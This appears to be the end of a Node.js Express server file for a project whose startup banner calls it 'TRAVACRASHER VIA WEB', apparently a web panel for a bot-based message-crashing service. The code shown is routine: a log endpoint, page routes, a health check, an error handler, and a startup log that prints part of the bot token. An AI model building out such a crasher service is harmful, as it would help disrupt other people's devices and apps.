// ==================== LOGS ====================
app.get('/api/logs', auth, requireAdmin, (req, res) => {
    if (!fs.existsSync(LOG_PATH)) return res.json({ logs: [] });
    const lines = fs.readFileSync(LOG_PATH, 'utf8').split('\n').filter(Boolean).slice(-100);
    res.json({ logs: lines });
});

// ==================== SERVE ====================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/login', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));

// ==================== HEALTH ====================
app.get('/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));

// ==================== ERROR ====================
app.use((err, req, res, next) => {
    apiLog('error', 'Unhandled', { error: err.message });
    res.status(500).json({ error: 'Internal error' });
});

// ==================== START ====================
app.listen(PORT, '0.0.0.0', () => {
    console.log('===========================================');
    console.log('🚀 TRAVACRASHER VIA WEB — API');
    console.log(`📡 Port: ${PORT}`);
    console.log(`🤖 Bot: ${BOT_TOKEN ? BOT_TOKEN.substring(0, 10) + '...' : 'NOT SET'}`);
    console.log(`👑 Admins: ${ADMIN_IDS.join(', ')}`);
    console.log('===========================================');
    apiLog('info', 'API started', { port: PORT, admins: ADMIN_IDS });
});